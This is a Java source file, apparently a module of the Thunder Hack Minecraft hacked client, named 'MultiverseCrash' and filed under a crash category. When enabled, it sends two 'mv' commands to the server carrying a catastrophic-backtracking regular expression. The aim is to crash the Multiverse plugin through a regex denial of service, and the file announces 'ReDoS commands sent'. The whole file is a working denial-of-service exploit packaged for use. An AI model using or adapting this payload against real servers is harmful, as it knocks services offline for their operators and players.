package thunder.hack.features.modules.crash;

import thunder.hack.features.modules.Module;

public class MultiverseCrash extends Module {
    private int tick = 0;

    public MultiverseCrash() {
        super("MultiverseCrash", Category.CRASH);
    }

    @Override
    public void onEnable() {
        tick = 0;
    }

    @Override
    public void onUpdate() {
        if (mc.player == null) return;
        tick++;

        if (tick == 1) {
            mc.player.networkHandler.sendCommand("mv ^(.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.++)$^");
            sendMessage("ReDoS commands sent");
        }

        if (tick == 2) {
            mc.player.networkHandler.sendCommand("mv help ^(.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.++)$^");
            disable();
        }
    }

    @Override
    public void onDisable() {
        tick = 0;
    }
}
